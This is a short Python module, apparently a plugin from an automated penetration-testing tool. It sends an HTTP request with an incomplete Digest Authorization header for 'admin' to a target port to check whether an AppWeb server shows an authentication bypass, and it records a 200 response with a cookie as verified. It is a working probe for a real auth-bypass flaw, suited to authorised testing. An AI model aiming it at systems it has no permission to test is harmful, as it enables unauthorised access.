import socket
import time


def run(context: dict) -> dict:
    target = context["target"]
    capability = context["capability"]
    matched = context.get("matched_service") or {}
    port = int(matched.get("port") or (capability.get("match", {}).get("ports") or [8080])[0])
    started = time.perf_counter()
    request = (
        "GET / HTTP/1.1\r\n"
        "Host: example.com\r\n"
        "User-Agent: MedFlow-Generated-Tool/0.1\r\n"
        "Accept: */*\r\n"
        "Authorization: Digest username=admin\r\n"
        "Connection: close\r\n\r\n"
    )
    result = {
        "allowed": True,
        "target": target,
        "service": "http",
        "port": port,
        "proof_goal": capability.get("proof_goal", "Validate AppWeb digest auth-bypass behavior."),
        "verified": False,
        "exploited": False,
        "cleanup_verified": True,
    }
    try:
        with socket.create_connection((target, port), timeout=5) as sock:
            sock.settimeout(5)
            sock.sendall(request.encode("utf-8"))
            chunks = []
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(len(item) for item in chunks) > 12000:
                    break
        response = b"".join(chunks).decode("utf-8", errors="replace")
        headers = response.split("\r\n\r\n", 1)[0]
        result["response_preview"] = headers[:800]
        result["verified"] = response.startswith("HTTP/1.1 200") and ("Set-Cookie:" in headers or "HttpOnly" in headers)
        if result["verified"]:
            result["proof_output"] = "Incomplete Digest Authorization request returned HTTP 200 with session/cookie signal."
        else:
            result["reason"] = "Expected HTTP 200 session/cookie auth-bypass signal was not observed."
    except Exception as exc:
        result["reason"] = f"AppWeb auth-bypass probe failed: {exc}"
    result["elapsed_seconds"] = round(time.perf_counter() - started, 3)
    return result
